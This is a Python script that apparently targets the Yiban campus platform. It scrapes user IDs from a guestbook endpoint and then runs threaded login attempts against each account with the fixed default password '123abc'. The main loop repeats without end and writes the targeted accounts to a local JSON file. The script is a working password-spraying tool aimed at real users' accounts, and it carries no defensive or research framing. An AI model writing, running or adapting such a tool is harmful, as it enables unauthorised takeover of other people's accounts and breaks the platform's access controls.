#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author: i2cy(i2cy@outlook.com)
# Filename: get_guestbook_users
# Created on: 2021/4/30

from api.yiban_API import *
from cnn.captchaRecongnise_CNN import *
import requests
import threading

APP_ID = 908892
ACCOUNT_LOG = "accounts/GUESTS.json"

PASSWORD = "123abc"

URL = "https://q.yiban.cn/"


class YibanGuestBook:

    def __init__(self, app_id, url=URL, debug=False, proxy=None):
        self.url = URL
        self.session = requests.Session()
        self.debug = debug
        self.app_id = app_id
        self.proxy = None

    def get(self):
        payload = {
            "appid":    str(self.app_id),
            "App_id":   str(self.app_id),
            "code":     "guestbook"
        }

        if self.proxy is None:
            get_session = self.session.post(self.url + "guestbook/getRandAjax/",
                                             headers=HEADER,
                                             data=payload,
                                             timeout=TIMEOUT
                                             )
        else:
            get_session = self.session.post(self.url + "guestbook/getRandAjax/",
                                             headers=HEADER,
                                             data=payload,
                                             timeout=TIMEOUT,
                                             proxies=self.proxy,
                                             verify=False
                                             )

        code = get_session.json()["code"]
        if code == 200:
            ret = get_session.json()["data"]
        else:
            raise Exception("web errno: {}".format(code))

        count = int(ret["count"])
        user_id = [ele["User_id"] for ele in ret["messageList"]]

        return {"total_guests_count": count,
                "user_id": user_id}


class YibanAccountCheck:

    def __init__(self, accounts):
        self.accounts = accounts
        self.results = {}
        self.threads = 0
        for ele in self.accounts.keys():
            self.results.update({ele: False})

    def reset(self):
        self.results = {}
        for ele in self.accounts.keys():
            self.results.update({ele: False})

    def check_single(self, username, password="123abc"):
        self.threads += 1
        ret = False

        try:
            token = yibanAPI({"username": username, "password": password}).login()
            if token is None:
                pass
            else:
                if username in self.accounts:
                    self.accounts[username] = True
                ret = True
        except:
            pass

        self.threads -= 1
        return ret

    def check_all(self, accounts=None):
        self.reset()
        if accounts is None:
            accounts = self.accounts

        for ele in accounts.keys():
            threading.Thread(target=self.check_single, args=(ele, accounts[ele])).start()

        time.sleep(1)

        while self.threads > 0:
            time.sleep(0.05)

        return self.results


def update_data(data):
    if os.path.exists(ACCOUNT_LOG):
        with open(ACCOUNT_LOG, "r") as f:
            all_data = json.load(f)

    all_data = {}

    for name in data.keys():
        all_data.update({name: PASSWORD})

    with open(ACCOUNT_LOG, "w") as f:
        json.dump(all_data, f, indent=2)



def test():
    api = YibanGuestBook(APP_ID)
    tmp = api.get()
    print("guests: \n{}".format(tmp["user_id"]))
    print("total guest count: {}".format(tmp["total_guests_count"]))

    accounts = {}
    for ele in tmp["user_id"]:
        accounts.update({ele: PASSWORD})

    ac = YibanAccountCheck(accounts)

    res = ac.check_all()

    for ele in res.keys():
        print(ele, res[ele])


def main():
    api = YibanGuestBook(APP_ID)
    tmp = api.get()
    print("total guest count: {}".format(tmp["total_guests_count"]))

    while True:
        print("guests: \n{}".format(tmp["user_id"]))
        accounts = {}
        for ele in tmp["user_id"]:
            accounts.update({ele: PASSWORD})

        ac = YibanAccountCheck(accounts)

        res = ac.check_all()

        for ele in res.keys():
            if res[ele]:
                print(ele, res[ele])

        update_data(res)




if __name__ == '__main__':
    main()